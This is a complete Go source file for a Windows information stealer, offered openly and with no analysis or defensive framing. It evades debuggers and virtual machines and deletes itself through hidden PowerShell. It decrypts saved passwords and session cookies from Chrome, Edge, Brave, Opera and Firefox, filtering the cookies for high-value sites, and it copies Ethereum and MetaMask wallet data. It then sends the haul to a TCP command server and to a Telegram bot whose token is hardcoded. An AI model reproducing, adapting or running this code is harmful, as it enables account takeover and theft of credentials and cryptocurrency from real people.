package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

var (
	modNSS3        *windows.LazyDLL
	pk11SDRDecrypt *windows.LazyProc

	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ntdll    = windows.NewLazyDLL("ntdll.dll")

	ntQueryInfoProc    = ntdll.NewProc("NtQueryInformationProcess")
	getUserDefaultLCID = kernel32.NewProc("GetUserDefaultLCID")

	valuableDomains = map[string]bool{
		"facebook.com":           true,
		"instagram.com":          true,
		"twitter.com":            true,
		"x.com":                  true,
		"vk.com":                 true,
		"ok.ru":                  true,
		"tiktok.com":             true,
		"mail.google.com":        true,
		"accounts.google.com":    true,
		"outlook.live.com":       true,
		"login.live.com":         true,
		"mail.yandex.ru":         true,
		"discord.com":            true,
		"web.whatsapp.com":       true,
		"web.telegram.org":       true,
		"steamcommunity.com":     true,
		"store.steampowered.com": true,
		"roblox.com":             true,
		"epicgames.com":          true,
		"paypal.com":             true,
		"binance.com":            true,
		"coinbase.com":           true,
	}

	staticKey = []byte{
		0x4e, 0x9c, 0x1a, 0xf3, 0xb2, 0x0d, 0xe7, 0x88,
		0x3f, 0x1b, 0x6c, 0x94, 0xa5, 0x2e, 0xd1, 0x77,
		0xc0, 0x83, 0xf6, 0x5a, 0x19, 0x44, 0xb8, 0xe2,
		0x6d, 0x30, 0x91, 0xc5, 0x7f, 0xaa, 0x28, 0xd9,
	}
)

const (
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
	MAX_PATH                  = 260
	PROCESS_DEBUG_PORT        = 7
)

func getSystemLocale() uint16 {
	lcid, _, _ := getUserDefaultLCID.Call()
	return uint16(lcid & 0xFFFF)
}

func isRestrictedRegion() bool {
	locale := getSystemLocale()
	restrictedLocales := map[uint16]bool{
		0x419: true,
		0x423: true,
	}
	return restrictedLocales[locale]
}

func getLocalAppData() string {
	dir, _ := os.UserConfigDir()
	if strings.Contains(strings.ToLower(dir), "appdata") {
		return filepath.Join(filepath.Dir(dir), "Local")
	}
	return filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local")
}

func getAppData() string {
	return filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
}

func getHostname() string {
	host, err := os.Hostname()
	if err != nil {
		return ""
	}
	return host
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return !os.IsNotExist(err)
}

func IsDebuggerPresent() bool {
	var (
		debugPort    uint32
		returnLength uint32
	)
	pseudoHandle, _ := syscall.GetCurrentProcess()
	status, _, _ := ntQueryInfoProc.Call(
		uintptr(pseudoHandle),
		uintptr(PROCESS_DEBUG_PORT),
		uintptr(unsafe.Pointer(&debugPort)),
		uintptr(unsafe.Sizeof(debugPort)),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	return status == 0 && debugPort != 0
}

func isVM() bool {
	if runtime.NumCPU() < 2 {
		return true
	}
	if os.Getenv("USERNAME") == "SANDBOX" {
		return true
	}
	if fileExists(`C:\windows\System32\vmtools.dll`) {
		return true
	}
	if fileExists(`C:\Program Files\VMware\VMware Tools\`) {
		return true
	}
	return false
}

func getGOOS() string {
	switch runtime.GOOS {
	case "windows":
		return "windows"
	case "linux":
		return "linux"
	case "darwin":
		return "mac"
	}
	return "UNKNOWN"
}

func detectBrowsers() []string {
	localAppData := getLocalAppData()
	browsers := []string{}
	paths := map[string]string{
		"Chrome":  filepath.Join(localAppData, "Google", "Chrome"),
		"Edge":    filepath.Join(localAppData, "Microsoft", "Edge"),
		"Brave":   filepath.Join(localAppData, "BraveSoftware", "Brave-Browser"),
		"Opera":   filepath.Join(getAppData(), "Opera Software", "Opera Stable"),
		"OperaGX": filepath.Join(getAppData(), "Opera Software", "Opera GX Stable"),
	}
	for name, path := range paths {
		if fileExists(path) {
			browsers = append(browsers, name)
		}
	}
	return browsers
}

func copyFile(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()
	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	return err
}

func initNSS(profilePath string) error {
	firefoxPath := filepath.Join(os.Getenv("ProgramFiles"), "Mozilla Firefox")
	if !fileExists(firefoxPath) {
		firefoxPath = filepath.Join(os.Getenv("ProgramFiles(x86)"), "Mozilla Firefox")
		if !fileExists(firefoxPath) {
			return errors.New("firefox not found")
		}
	}

	tmpDir := filepath.Join(os.TempDir(), "ff_nss")
	os.MkdirAll(tmpDir, 0755)
	for _, dll := range []string{"nss3.dll", "softokn3.dll", "freebl3.dll"} {
		src := filepath.Join(firefoxPath, dll)
		dst := filepath.Join(tmpDir, dll)
		if fileExists(src) {
			copyFile(src, dst)
		}
	}

	modNSS3 = windows.NewLazyDLL(filepath.Join(tmpDir, "nss3.dll"))
	pk11SDRDecrypt = modNSS3.NewProc("PK11SDR_Decrypt")

	nssInit := modNSS3.NewProc("NSS_Init")
	if nssInit == nil {
		return errors.New("NSS_Init not found")
	}

	utf16Path, _ := windows.UTF16PtrFromString(profilePath)
	ret, _, _ := nssInit.Call(uintptr(unsafe.Pointer(utf16Path)))
	if ret != 0 {
		return errors.New("NSS_Init failed")
	}
	return nil
}

func decryptFirefoxData(encryptedBase64 string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encryptedBase64)
	if err != nil {
		return "", err
	}

	inBlob := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}
	var outBlob windows.DataBlob

	ret, _, _ := pk11SDRDecrypt.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		uintptr(unsafe.Pointer(&outBlob)),
		0,
	)
	if ret == 0 {
		return "", errors.New("decryption failed")
	}

	result := make([]byte, outBlob.Size)
	for i := uint32(0); i < outBlob.Size; i++ {
		result[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(outBlob.Data)) + uintptr(i)))
	}
	windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(outBlob.Data))))
	return string(result), nil
}

func getChromeMasterKey() []byte {
	localAppData := os.Getenv("LOCALAPPDATA")
	localStatePath := filepath.Join(localAppData, "Google", "Chrome", "User Data", "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}
	var localState struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil
	}
	encryptedKey, _ := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
		return nil
	}
	var dataOut windows.DataBlob
	err = windows.CryptUnprotectData(
		&windows.DataBlob{
			Data: &encryptedKey[5],
			Size: uint32(len(encryptedKey) - 5),
		},
		nil,
		nil,
		0,
		nil,
		0,
		&dataOut,
	)
	if err != nil {
		return nil
	}
	masterKey := make([]byte, dataOut.Size)
	for i := uint32(0); i < dataOut.Size; i++ {
		masterKey[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(dataOut.Data)) + uintptr(i)))
	}
	windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(dataOut.Data))))
	return masterKey
}

func stealWallets() string {
	appData := getAppData()
	localAppData := getLocalAppData()
	paths := []string{
		filepath.Join(appData, "Ethereum", "keystore"),
		filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
		filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
		filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
	}
	var result strings.Builder
	result.WriteString("[WALLETS]")
	for _, p := range paths {
		if !fileExists(p) {
			continue
		}
		files, _ := os.ReadDir(p)
		for _, f := range files {
			if f.IsDir() {
				continue
			}
			content, err := os.ReadFile(filepath.Join(p, f.Name()))
			if err == nil {
				result.WriteString("Keystore: " + string(content) + "\n")
			}
		}
	}
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3"}
	for _, p := range profiles {
		lsPath := filepath.Join(localAppData, "Google", "Chrome", "User Data", p, "Local Storage", "leveldb")
		if fileExists(lsPath) {
			files, _ := os.ReadDir(lsPath)
			for _, f := range files {
				if f.IsDir() || !strings.HasSuffix(f.Name(), ".ldb") {
					continue
				}
				content, err := os.ReadFile(filepath.Join(lsPath, f.Name()))
				if err != nil {
					continue
				}
				metamaskSig := []byte("nkbihfbeogaeaoehlefnkodbefgpgknn")
				if idx := bytes.Index(content, metamaskSig); idx != -1 {
					start := idx - 500
					if start < 0 {
						start = 0
					}
					end := idx + 500
					if end > len(content) {
						end = len(content)
					}
					snippet := base64.StdEncoding.EncodeToString(content[start:end])
					result.WriteString("MetaMask Snippet (base64): " + snippet + "\n")
				}
			}
		}
		if result.String() == "[WALLETS]" {
			result.WriteString("no_wallets_found")
		}
	}
	return result.String()
}

func stealCookies(browsers []string) string {
	var result strings.Builder
	result.WriteString("[COOKIES]")

	masterKey := getChromeMasterKey()
	if masterKey == nil || len(masterKey) != 32 {
		return "[COOKIES]no_masterkey"
	}

	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3"}

	for _, browser := range browsers {
		var baseDir string
		switch browser {
		case "Chrome":
			baseDir = filepath.Join(getLocalAppData(), "Google", "Chrome", "User Data")
		case "Edge":
			baseDir = filepath.Join(getLocalAppData(), "Microsoft", "Edge", "User Data")
		case "Brave":
			baseDir = filepath.Join(getLocalAppData(), "BraveSoftware", "Brave-Browser", "User Data")
		case "Opera":
			baseDir = filepath.Join(getAppData(), "Opera Software", "Opera Stable")
		case "OperaGX":
			baseDir = filepath.Join(getAppData(), "Opera Software", "Opera GX Stable")
		default:
			continue
		}

		for _, profile := range profiles {
			cookiePath := ""
			if browser == "Opera" || browser == "OperaGX" {
				cookiePath = filepath.Join(baseDir, "Cookies")
			} else {
				cookiePath = filepath.Join(baseDir, profile, "Network", "Cookies")
			}

			if !fileExists(cookiePath) {
				continue
			}

			tmpDB := filepath.Join(os.TempDir(), fmt.Sprintf("cookies_%s_%s.db", browser, profile))
			if err := copyFile(cookiePath, tmpDB); err != nil {
				continue
			}
			defer os.Remove(tmpDB)

			db, err := sql.Open("sqlite3", "file:"+tmpDB+"?mode=ro")
			if err != nil {
				continue
			}

			rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key != '' AND name != ''")
			if err != nil {
				db.Close()
				continue
			}

			for rows.Next() {
				var host, name string
				var enc []byte
				if err := rows.Scan(&host, &name, &enc); err != nil || len(enc) == 0 {
					continue
				}

				cleanHost := strings.TrimPrefix(host, ".")
				domainParts := strings.Split(cleanHost, ".")
				rootDomain := cleanHost
				if len(domainParts) >= 2 {
					rootDomain = strings.Join(domainParts[len(domainParts)-2:], ".")
				}

				if !valuableDomains[rootDomain] && !valuableDomains[cleanHost] {
					continue
				}

				var value string
				if len(enc) >= 15 {
					prefix := string(enc[:3])
					if prefix == "v10" || prefix == "v11" {
						nonce := enc[3:15]
						ciphertext := enc[15:]

						block, _ := aes.NewCipher(masterKey)
						gcm, _ := cipher.NewGCM(block)
						plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
						if err == nil {
							value = string(plaintext)
						}
					}
				}

				if value == "" {
					value = "[ENCRYPTED:" + base64.StdEncoding.EncodeToString(enc) + "]"
				}

				result.WriteString(fmt.Sprintf("[%s-%s] %s\t%s\t%s\n", browser, profile, host, name, value))
			}

			rows.Close()
			db.Close()
		}
	}

	if result.String() == "[COOKIES]" {
		result.WriteString("no_cookies_found")
	}
	return result.String()
}

func stealFirefoxCookies() string {
	appData := os.Getenv("APPDATA")
	profilesPath := filepath.Join(appData, "Mozilla", "Firefox", "Profiles")
	var result strings.Builder
	result.WriteString("[FIREFOX_COOKIES]")

	entries, _ := os.ReadDir(profilesPath)
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		cookiePath := filepath.Join(profilesPath, entry.Name(), "cookies.sqlite")
		if !fileExists(cookiePath) {
			continue
		}

		tmpDB := filepath.Join(os.TempDir(), "ff_cookies.db")
		copyFile(cookiePath, tmpDB)
		defer os.Remove(tmpDB)

		db, _ := sql.Open("sqlite3", "file:"+tmpDB+"?mode=ro")
		rows, _ := db.Query("SELECT host, name, value FROM moz_cookies")
		for rows.Next() {
			var host, name, value string
			rows.Scan(&host, &name, &value)
			cleanHost := strings.TrimPrefix(host, ".")
			domainParts := strings.Split(cleanHost, ".")
			rootDomain := cleanHost
			if len(domainParts) >= 2 {
				rootDomain = strings.Join(domainParts[len(domainParts)-2:], ".")
			}
			if valuableDomains[rootDomain] || valuableDomains[cleanHost] {
				result.WriteString(fmt.Sprintf("%s\t%s\t%s\n", host, name, value))
			}
		}
		rows.Close()
		db.Close()
	}

	if result.String() == "[FIREFOX_COOKIES]" {
		result.WriteString("no_cookies_found")
	}
	return result.String()
}

func stealPasswords() string {
	localAppData := getLocalAppData()
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3"}
	var result strings.Builder
	result.WriteString("[PASSWORDS]")

	masterKey := getChromeMasterKey()
	if masterKey == nil || len(masterKey) != 32 {
		return "[PASSWORDS]no_masterkey"
	}

	for _, profile := range profiles {
		loginPath := filepath.Join(localAppData, "Google", "Chrome", "User Data", profile, "Login Data")
		if !fileExists(loginPath) {
			continue
		}

		tmpDB := filepath.Join(os.TempDir(), fmt.Sprintf("login_%s.db", profile))
		if err := copyFile(loginPath, tmpDB); err != nil {
			continue
		}
		defer os.Remove(tmpDB)

		db, err := sql.Open("sqlite3", "file:"+tmpDB+"?mode=ro")
		if err != nil {
			continue
		}

		rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' AND password_value != ''")
		if err != nil {
			db.Close()
			continue
		}

		for rows.Next() {
			var url, username string
			var encPass []byte
			if err := rows.Scan(&url, &username, &encPass); err != nil {
				continue
			}

			if len(encPass) < 15 {
				continue
			}

			prefix := string(encPass[:3])
			if prefix != "v10" && prefix != "v11" {
				continue
			}

			nonce := encPass[3:15]
			ciphertext := encPass[15:]

			block, err := aes.NewCipher(masterKey)
			if err != nil {
				continue
			}

			gcm, err := cipher.NewGCM(block)
			if err != nil {
				continue
			}

			plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			if err != nil {
				continue
			}

			password := string(plaintext)
			result.WriteString(fmt.Sprintf("URL: %s | User: %s | Pass: %s\n", url, username, password))
		}

		rows.Close()
		db.Close()
	}

	if result.String() == "[PASSWORDS]" {
		result.WriteString("no_passwords_found")
	}
	return result.String()
}

func stealFirefoxPasswords() string {
	appData := os.Getenv("APPDATA")
	profilesPath := filepath.Join(appData, "Mozilla", "Firefox", "Profiles")

	if !fileExists(profilesPath) {
		return "[FIREFOX]no_profiles"
	}

	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return "[FIREFOX]read_error"
	}

	var result strings.Builder
	result.WriteString("[FIREFOX_PASSWORDS]")

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		profilePath := filepath.Join(profilesPath, entry.Name())
		loginsPath := filepath.Join(profilePath, "logins.json")

		if !fileExists(loginsPath) {
			continue
		}

		if err := initNSS(profilePath); err != nil {
			continue
		}

		data, _ := os.ReadFile(loginsPath)
		var logins struct {
			Logins []struct {
				Hostname          string `json:"hostname"`
				EncryptedUsername string `json:"encryptedUsername"`
				EncryptedPassword string `json:"encryptedPassword"`
			} `json:"logins"`
		}
		json.Unmarshal(data, &logins)

		for _, login := range logins.Logins {
			username, _ := decryptFirefoxData(login.EncryptedUsername)
			password, _ := decryptFirefoxData(login.EncryptedPassword)
			if username != "" || password != "" {
				result.WriteString(fmt.Sprintf("URL: %s | User: %s | Pass: %s\n", login.Hostname, username, password))
			}
		}
	}

	if result.String() == "[FIREFOX_PASSWORDS]" {
		result.WriteString("no_passwords_found")
	}
	return result.String()
}

func sendFileToTelegram(filename, content string) {
	botToken := "8363839612:AAGSOPKmyHxOIzAqfmjXiKdeqoHlZCSmrmU"
	chatID := "966241558"

	url := "https://api.telegram.org/bot" + botToken + "/sendDocument"

	tmpFile := filepath.Join(os.TempDir(), filename)
	os.WriteFile(tmpFile, []byte(content), 0600)
	defer os.Remove(tmpFile)

	file, _ := os.Open(tmpFile)
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ = writer.WriteField("chat_id", chatID)
	part, _ := writer.CreateFormFile("document", filename)
	io.Copy(part, file)
	writer.Close()

	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{Timeout: 15 * time.Second}
	client.Do(req)
}

func selfDelete() {
	exe, _ := os.Executable()
	windows.MoveFileEx(windows.StringToUTF16Ptr(exe), nil, windows.MOVEFILE_DELAY_UNTIL_REBOOT)
	script := fmt.Sprintf(`
$e = "%s"
Start-Sleep -s 1
Remove-Item -Path $e -Force -ErrorAction SilentlyContinue
`, exe)
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
	os.Exit(0)
}

func encryptAESGCM(plaintext []byte, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("ключ должен быть 32 байта")
	}
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func sendEncryptedFileToC2(data []byte, c2Addr string, key []byte) error {
	encrypted, err := encryptAESGCM(data, key)
	if err != nil {
		return err
	}

	conn, err := net.Dial("tcp", c2Addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	lenBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(lenBuf, uint16(len(encrypted)))
	conn.Write(lenBuf)
	conn.Write(encrypted)
	return nil
}

func main() {
	if isVM() || IsDebuggerPresent() {
		selfDelete()
	}

	runtime.GOMAXPROCS(4)

	browsers := detectBrowsers()
	hostname := getHostname()
	osname := getGOOS()
	victim_id := fmt.Sprintf("PC-%d", time.Now().Unix())

	firefoxInstalled := false
	firefoxBasePath := filepath.Join(getAppData(), "Mozilla", "Firefox", "Profiles")
	if fileExists(firefoxBasePath) {
		entries, _ := os.ReadDir(firefoxBasePath)
		for _, e := range entries {
			if e.IsDir() {
				firefoxInstalled = true
				break
			}
		}
	}

	data := map[string]any{
		"victim_id": victim_id,
		"hostname":  hostname,
		"os":        osname,
		"browser":   browsers,
	}

	hasChromium := false
	for _, b := range browsers {
		if b != "Firefox" {
			hasChromium = true
			break
		}
	}

	if hasChromium {
		data["cookies"] = stealCookies(browsers)
		data["passwords"] = stealPasswords()
		data["wallets"] = stealWallets()
	}

	if firefoxInstalled {
		data["firefox_cookies"] = stealFirefoxCookies()
		data["firefox_passwords"] = stealFirefoxPasswords()
	}

	jsonData, _ := json.Marshal(data)

	if err := sendEncryptedFileToC2(jsonData, "localhost:8080", staticKey); err != nil {
		return
	}
	sendFileToTelegram(victim_id, string(jsonData))

	selfDelete()
}
